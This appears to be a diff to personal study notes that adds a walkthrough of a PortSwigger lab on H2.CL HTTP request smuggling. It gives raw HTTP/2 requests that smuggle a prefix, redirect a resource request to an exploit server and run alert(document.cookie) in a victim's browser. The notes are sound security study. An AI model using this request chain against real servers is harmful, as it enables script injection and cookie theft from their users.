@@ -4360,7 +4360,59 @@ Response: Communication timed out. (chunked size is 5)
     X-Ignore: X
     ```
   - Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources OR request GET /resources/js/tracking.js (search "administrator") 
-- dd
+- **H2.CL** request smuggling
+  - Info: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.
+  - https://www.youtube.com/watch?v=n2k5zdA0ycg
+  - smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix
+    ```
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 0
+
+    SMUGGLED
+
+    Response
+    HTTP/2 404 Not Found
+    ```
+  - smuggle the start of a request for /resources, along with an arbitrary Host header
+    ```
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 0
+
+    GET /resources HTTP/1.1
+    Host: foo
+    Content-Length: 5
+
+    x=1
+
+    Response
+    HTTP/2 302 Found
+    Location: https://foo/resources/
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 0
+    ```
+  - Exploit server
+    file: /resources
+    body: alert(document.cookie)
+  - Send repeater request to point the host to exploit server (send the requests few times)
+    ```
+    POST / HTTP/2
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 0
+
+    GET /resources HTTP/1.1
+    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+    Content-Length: 5
+
+    x=1
+
+    Response
+    HTTP/2 302 Found
+    Location: https://exploit-0a7d0019030dbe838029b11701a800eb.exploit-server.net/resources/
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 0
+    ```
 - dd
 - dd
 - dd
